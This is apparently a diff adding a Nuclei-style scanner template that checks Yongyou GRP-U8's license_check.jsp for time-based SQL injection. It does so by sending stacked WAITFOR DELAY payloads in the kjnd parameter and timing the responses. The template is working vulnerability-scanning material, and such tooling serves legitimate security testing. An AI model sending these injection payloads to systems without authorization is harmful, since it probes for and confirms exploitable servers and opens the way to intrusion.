@@ -1,0 +1,37 @@
+id: yongyou-grp-u8-license_check-sqli
+
+info:
+  name: yongyou-grp-u8-license_check-sqli
+  author: yongyou-grp-u8-license_check-sqli
+
+
+requests:
+  - raw:
+      - |     
+        GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |     
+        GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+      - |     
+        GET /u8qx/license_check.jsp?kjnd=1';WAITFOR%20DELAY%20'0:0:9'-- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
